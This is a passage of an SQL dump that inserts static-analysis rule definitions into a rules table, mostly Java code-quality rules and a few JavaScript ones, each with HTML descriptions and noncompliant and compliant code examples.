</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'suspicious,tests', false, 'HTML', 1510817813126, 1510817813127, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1042, 'Utility classes should not have public constructors', 'S1118', NULL, 'squid', '<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can
be extended, should not have public constructors.</p>
<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor
should be defined.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class StringUtils { // Noncompliant

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class StringUtils { // Compliant

  private StringUtils() {
    throw new IllegalStateException("Utility class");
  }

  public static String concatenate(String s1, String s2) {
    return s1 + s2;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this
rule.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'design', false, 'HTML', 1510817813127, 1510817813128, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1043, 'Wildcard imports should not be used', 'S2208', NULL, 'squid', '<p>Blindly importing all the classes in a package clutters the class namespace and could lead to conflicts between classes in different packages with
the same name. On the other hand, specifically listing the necessary classes avoids that problem and makes clear which versions were wanted.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.*; // Noncompliant
import java.util.*; // Noncompliant

private Date date; // Date class exists in java.sql and java.util. Which one is this?
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Date;
import java.util.List;
import java.util.ArrayList;

private Date date;
</pre>
<h2>Exceptions</h2>
<p>Static imports are ignored by this rule. E.G.</p>
<pre>
import static java.lang.Math.*;
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813128, 1510817813129, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1044, 'Track uses of disallowed dependencies', 'S3417', NULL, 'squid', '<p>Whether they are disallowed locally for security, license, or dependability reasons, forbidden dependencies should not be used. </p>
<p>This rule raises an issue when the group or artifact id of a direct dependency matches the configured forbidden dependency pattern. </p>
<h2>Noncompliant Code Example</h2>
<p>With a parameter of: <code>*:.*log4j.*</code></p>
<pre>
&lt;dependency&gt; &lt;!-- Noncompliant --&gt;
    &lt;groupId&gt;log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j&lt;/artifactId&gt;
    &lt;version&gt;1.2.17&lt;/version&gt;
&lt;/dependency&gt;
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'maven', true, 'HTML', 1510817813129, 1510817813129, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1045, '"static" members should be accessed statically', 'S2209', NULL, 'squid', '<p>While it is <em>possible</em> to access <code>static</code> members from a class instance, it''s bad form, and considered by most to be misleading
because it implies to the readers of your code that there''s an instance of the member per class instance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class A {
  public static int counter = 0;
}

public class B {
  private A first = new A();
  private A second = new A();

  public void runUpTheCount() {
    first.counter ++;  // Noncompliant
    second.counter ++;  // Noncompliant. A.counter is now 2, which is perhaps contrary to expectations
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class A {
  public static int counter = 0;
}

public class B {
  private A first = new A();
  private A second = new A();

  public void runUpTheCount() {
    A.counter ++;  // Compliant
    A.counter ++;  // Compliant
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813131, 1510817813131, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1048, 'Classes with only "static" methods should not be instantiated', 'S2440', NULL, 'squid', '<p><code>static</code> methods can be accessed without an instance of the enclosing class, so there''s no reason to instantiate a class that has only
<code>static</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class TextUtils {
  public static String stripHtml(String source) {
    return source.replaceAll("&lt;[^&gt;]+&gt;", "");
  }
}

public class TextManipulator {

  // ...

  public void cleanText(String source) {
    TextUtils textUtils = new TextUtils(); // Noncompliant

    String stripped = textUtils.stripHtml(source);

    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class TextUtils {
  public static String stripHtml(String source) {
    return source.replaceAll("&lt;[^&gt;]+&gt;", "");
  }
}

public class TextManipulator {

  // ...

  public void cleanText(String source) {
    String stripped = TextUtils.stripHtml(source);

    //...
  }
}
</pre>
<h2>See Also</h2>
<ul>
  <li> {rule:squid:S1118} - Utility classes should not have public constructors </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813134, 1510817813135, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1049, 'Multiline blocks should be enclosed in curly braces', 'S2681', NULL, 'squid', '<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs. </p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

if (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally

if (condition) firstActionInBlock();  // Noncompliant
  secondAction();  // Executed unconditionally

if (condition); secondAction();  // Noncompliant; secondAction executed unconditionally

String str = null;
for (int i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817813135, 1510817813136, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1050, '"compareTo" results should not be checked for specific values', 'S2200', NULL, 'squid', '<p>While most <code>compareTo</code> methods return -1, 0, or 1, some do not, and testing the result of a <code>compareTo</code> against a specific
value other than 0 could result in false negatives.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (myClass.compareTo(arg) == -1) {  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myClass.compareTo(arg) &lt; 0) {
  // ...
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unpredictable', false, 'HTML', 1510817813136, 1510817813137, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1051, '"Lock" objects should not be "synchronized"', 'S2442', NULL, 'squid', '<p><code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with
<code>synchronized</code> blocks. So synchronizing on a <code>Lock</code> throws away the power of the object, and is just silly. Instead, such
objects should be locked and unlocked using <code>tryLock()</code> and <code>unlock()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Lock lock = new MyLockImpl();
synchronized(lock) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Lock lock = new MyLockImpl();
lock.tryLock();
//...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/cQCaAg">CERT, LCK03-J.</a> - Do not synchronize on the intrinsic locks of high-level
  concurrency objects </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,clumsy,multi-threading', false, 'HTML', 1510817813137, 1510817813138, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1052, 'Non-serializable objects should not be stored in "HttpSession" objects', 'S2441', NULL, 'squid', '<p>If you have no intention of writting an <code>HttpSession</code> object to file, then storing non-<code>serializable</code> objects in it may not
seem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk anyway, as the server manages its memory use
in a process called "passivation". Further, some servers automatically write their active sessions out to file at shutdown &amp; deserialize any such
sessions at startup.</p>
<p>The point is, that even though <code>HttpSession</code> does not <code>extend Serializable</code>, you must nonetheless assume that it will be
serialized, and understand that if you''ve stored non-serializable objects in the session, errors will result. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Address {
  //...
}

//...
HttpSession session = request.getSession();
session.setAttribute("address", new Address());  // Noncompliant; Address isn''t serializable
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/579.html">MITRE, CWE-579</a> - J2EE Bad Practices: Non-serializable Object Stored in Session
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe', false, 'HTML', 1510817813138, 1510817813139, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1053, '"Collections.EMPTY_LIST", "EMPTY_MAP", and "EMPTY_SET" should not be used', 'S1596', NULL, 'squid', '<p>Since the introduction of generics in Java 5, the use of generic types such as <code>List&lt;String&gt;</code> is recommended over the use of raw
ones such as <code>List</code>. Assigning a raw type to a generic one is not type safe, and will generate a warning. The old <code>EMPTY_...</code>
fields of the <code>Collections</code> class return raw types, whereas the newer <code>empty...()</code> methods return generic ones.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; collection1 = Collections.EMPTY_LIST;  // Noncompliant
Map&lt;String, String&gt; collection2 = Collections.EMPTY_MAP;  // Noncompliant
Set&lt;String&gt; collection3 = Collections.EMPTY_SET;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; collection1 = Collections.emptyList();
Map&lt;String, String&gt; collection2 = Collections.emptyMap();
Set&lt;String&gt; collection3 = Collections.emptySet();
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'obsolete,pitfall', false, 'HTML', 1510817813139, 1510817813140, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1126, 'A "for" loop update clause should move the counter in the right direction', 'S2251', NULL, 'javascript', 'A <code>for</code> loop with a stop condition that can never be reached, such as one with a counter that moves in the wrong direction, will run infinitely. While there are occasions when an infinite loop is intended, the convention is to construct such loops as <code>while</code> loops. More typically, an infinite <code>for</code> loop is a bug. 

<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i < strings.length; i--) { // Noncompliant;
  //...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
for (var i = 0; i < strings.length; i++) {
  //...
}
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813238, 1510817813239, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1127, 'Functions should not be defined inside loops', 'FunctionDefinitionInsideLoop', NULL, 'javascript', '<p>
  Defining a function inside of a loops can yield unexpected results because under the covers, only a single instance of the function is defined. Rather than creating new function instances, the loop iterations simply update the function''s variables. Instead, the function should be returned.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var funs = [];
for (var i = 0; i < 13; i++) {
  funs[i] = function() { // Non-Compliant
    return i;
  };
}
print(funs[0]()); // 13 instead of 0
print(funs[1]()); // 13 instead of 1
print(funs[2]()); // 13 instead of 2
print(funs[3]()); // 13 instead of 3
...
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817813240, 1510817813241, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1054, 'Lazy initialization of "static" fields should be "synchronized"', 'S2444', NULL, 'squid', '<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of non-<code>volatile</code> fields could mean that a second thread
has access to a half-initialized object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the
initialization block should be <code>synchronized</code> or the variable made <code>volatile</code>.</p>
<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
protected static Object instance = null;

public static Object getInstance() {
    if (instance != null) {
        return instance;
    }

    instance = new Object();  // Noncompliant
    return instance;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
protected static volatile Object instance = null;

public static Object getInstance() {
    if (instance != null) {
        return instance;
    }

    instance = new Object();
    return instance;
}
</pre>
<p>or </p>
<pre>
protected static Object instance = null;

public static synchronized Object getInstance() {
    if (instance != null) {
        return instance;
    }

    instance = new Object();
    return instance;
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817813140, 1510817813141, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1055, 'Return values from functions without side effects should not be ignored', 'S2201', NULL, 'squid', '<p>When the call to a function doesn''t have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn''t behave as expected. </p>
<p>To prevent generating any false-positives, this rule triggers an issues only on the following predefined list of immutable classes in the Java API
:</p>
<ul>
  <li> <code>java.lang.String</code> </li>
  <li> <code>java.lang.Boolean</code> </li>
  <li> <code>java.lang.Integer</code> </li>
  <li> <code>java.lang.Double</code> </li>
  <li> <code>java.lang.Float</code> </li>
  <li> <code>java.lang.Byte</code> </li>
  <li> <code>java.lang.Character</code> </li>
  <li> <code>java.lang.Short</code> </li>
  <li> <code>java.lang.StackTraceElement</code> </li>
  <li> <code>java.time.DayOfWeek</code> </li>
  <li> <code>java.time.Duration</code> </li>
  <li> <code>java.time.Instant</code> </li>
  <li> <code>java.time.LocalDate</code> </li>
  <li> <code>java.time.LocalDateTime</code> </li>
  <li> <code>java.time.LocalTime</code> </li>
  <li> <code>java.time.Month</code> </li>
  <li> <code>java.time.MonthDay</code> </li>
  <li> <code>java.time.OffsetDateTime</code> </li>
  <li> <code>java.time.OffsetTime</code> </li>
  <li> <code>java.time.Period</code> </li>
  <li> <code>java.time.Year</code> </li>
  <li> <code>java.time.YearMonth</code> </li>
  <li> <code>java.time.ZonedDateTime</code> </li>
  <li> <code>java.math.BigInteger</code> </li>
  <li> <code>java.math.BigDecimal</code> </li>
  <li> <code>java.util.Optional</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void handle(String command){
  command.toLowerCase(); // Noncompliant; result of method thrown away
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void handle(String command){
  String formattedCommand = command.toLowerCase();
  ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when both these conditions are met:</p>
<ul>
  <li> The method call is in a <code>try</code> block with an associated <code>catch</code> clause. </li>
  <li> The method name starts with "parse", "format", "decode" or "valueOf" or the method is <code>String.getBytes(Charset)</code>. </li>
</ul>
<pre>
private boolean textIsInteger(String textToCheck) {

    try {
        Integer.parseInt(textToCheck, 10); // OK
        return true;
    } catch (NumberFormatException ignored) {
        return false;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2012, 17.7 - The value returned by a function having non-void return type shall be used </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/eoAyAQ">CERT, EXP12-CPP.</a> - Do not ignore values returned by functions or methods
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,misra', false, 'HTML', 1510817813141, 1510817813142, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1056, 'Package declaration should match source file directory', 'S1598', NULL, 'squid', '<p>By convention, a Java class'' physical location (source directories) and its logical representation (packages) should be kept in sync. Thus a Java
file located at "src/org/sonarqube/Foo.java" should have a package of "org.sonarqube". </p>
<p>Unfortunately, this convention is not enforced by Java compilers, and nothing prevents a developer from making the "Foo.java" class part of the
"com.apple" package, which could degrade the maintainability of both the class and its application.</p>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813143, 1510817813143, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1057, '".equals()" should not be used to test the values of "Atomic" classes', 'S2204', NULL, 'squid', '<p><code>AtomicInteger</code>, and <code>AtomicLong</code> extend <code>Number</code>, but they''re distinct from <code>Integer</code> and
<code>Long</code> and should be handled differently. <code>AtomicInteger</code> and <code>AtomicLong</code> are designed to support lock-free,
thread-safe programming on single variables. As such, an <code>AtomicInteger</code> will only ever be "equal" to itself. Instead, you should
<code>.get()</code> the value and make comparisons on it.</p>
<p>This applies to all the atomic, seeming-primitive wrapper classes: <code>AtomicInteger</code>, <code>AtomicLong</code>, and
<code>AtomicBoolean</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
AtomicInteger aInt1 = new AtomicInteger(0);
AtomicInteger aInt2 = new AtomicInteger(0);

if (aInt1.equals(aInt2)) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
AtomicInteger aInt1 = new AtomicInteger(0);
AtomicInteger aInt2 = new AtomicInteger(0);

if (aInt1.get() == aInt2.get()) { ... }
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817813144, 1510817813144, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1058, '"notifyAll" should be used', 'S2446', NULL, 'squid', '<p><code>notify</code> and <code>notifyAll</code> both wake up sleeping threads, but <code>notify</code> only rouses one, while <code>notifyAll</code>
rouses all of them. Since <code>notify</code> might not wake up the right thread, <code>notifyAll</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyThread extends Thread{

  @Override
  public void run(){
    synchronized(this){
      // ...
      notify();  // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyThread extends Thread{

  @Override
  public void run(){
    synchronized(this){
      // ...
      notifyAll();
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/OoAlAQ">CERT, THI02-J.</a> - Notify all waiting threads rather than a single thread
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,multi-threading', false, 'HTML', 1510817813145, 1510817813145, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1059, '"private" methods that don''t access instance data should be "static"', 'S2325', NULL, 'squid', '<p><code>private</code> methods that don''t access instance data can be <code>static</code> to prevent any misunderstanding about the contract of the
method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Utilities {
  private static String magicWord = "magic";

  private String getMagicWord() { // Noncompliant
    return magicWord;
  }

  private void setMagicWord(String value) { // Noncompliant
    magicWord = value;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Utilities {
  private static String magicWord = "magic";

  private static String getMagicWord() {
    return magicWord;
  }

  private static void setMagicWord(String value) {
    magicWord = value;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:</p>
<ul>
  <li> <code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code> </li>
  <li> <code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code> </li>
  <li> <code>private void readObjectNoData() throws ObjectStreamException;</code> </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813146, 1510817813146, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1060, 'Blocks should be synchronized on "private final" fields', 'S2445', NULL, 'squid', '<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So synchronizing on a non-<code>final</code>
field makes it possible for the field''s value to change while a thread is in a block synchronized on the old value. That would allow a second thread,
synchronized on the new value, to enter the block at the same time.</p>
<p>The story is very similar for synchronizing on parameters; two different threads running the method in parallel could pass two different object
instances in to the method as parameters, completely undermining the synchronization.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private String color = "red";

private void doSomething(){
  synchronized(color) {  // Noncompliant; lock is actually on object instance "red" referred to by the color variable
    //...
    color = "green"; // other threads now allowed into this block
    // ...
  }
  synchronized(new Object()) { // Noncompliant this is a no-op.
     // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private String color = "red";
private final Object lockObj = new Object();

private void doSomething(){
  synchronized(lockObj) {
    //...
    color = "green";
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/412.html">MITRE, CWE-412</a> - Unrestricted Externally Accessible Lock </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/413">MITRE, CWE-413</a> - Improper Resource Locking </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/6IEzAg">CERT, LCK00-J.</a> - Use private final lock objects to synchronize classes that
  may interact with untrusted code </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,multi-threading', false, 'HTML', 1510817813147, 1510817813147, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1061, 'Cognitive Complexity of methods should not be too high', 'S3776', NULL, 'squid', '<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '5min', 'per complexity point over the threshold', NULL, 'brain-overload', false, 'HTML', 1510817813148, 1510817813148, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1062, '"collect" should be used with "Streams" instead of "list::add"', 'S2203', NULL, 'squid', '<p>While you can use either <code>forEach(list::add)</code> or <code>collect</code> with a <code>Stream</code>, <code>collect</code> is by far the
better choice because it''s automatically thread-safe and parallellizable. </p>
<h2>Noncompliant Code Example</h2>
<pre>
